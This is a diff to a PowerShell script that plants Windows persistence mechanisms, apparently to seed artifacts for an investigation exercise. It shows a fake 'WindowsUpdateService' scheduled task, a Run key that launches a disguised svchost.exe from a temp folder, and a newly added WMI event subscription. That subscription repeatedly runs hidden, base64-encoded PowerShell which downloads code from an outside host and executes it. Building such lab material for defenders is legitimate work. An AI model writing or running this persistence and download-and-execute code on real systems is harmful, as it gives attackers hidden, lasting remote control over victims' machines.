@@ -172,7 +172,26 @@ Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger
 # 4. Registry Run Key (Persistence)
 New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateSvc" -Value "C:\Windows\Temp\svchost.exe" -PropertyType String -Force
 
-# 5. PowerShell History (breadcrumbs)
+# 5. WMI Event Subscription (Advanced Persistence — hardest to find)
+$filterName = "WindowsUpdateFilter"
+$consumerName = "WindowsUpdateConsumer"
+$wmiFilter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{
+    Name           = $filterName
+    EventNamespace = "root/cimv2"
+    QueryLanguage  = "WQL"
+    Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+$wmiConsumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{
+    Name               = $consumerName
+    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAGUAcgB2AGkAYwBlAC4AeAB5AHoALwB3AG0AaQAiACkAfABJAEUAWAA="
+}
+Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
+    Filter   = $wmiFilter
+    Consumer = $wmiConsumer
+}
+Write-Host "    WMI persistence planted ($consumerName)"
+
+# 6. PowerShell History (breadcrumbs)
 $historyPath = "C:\Users\Public\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
 New-Item -ItemType Directory -Path $historyPath -Force | Out-Null
 @"
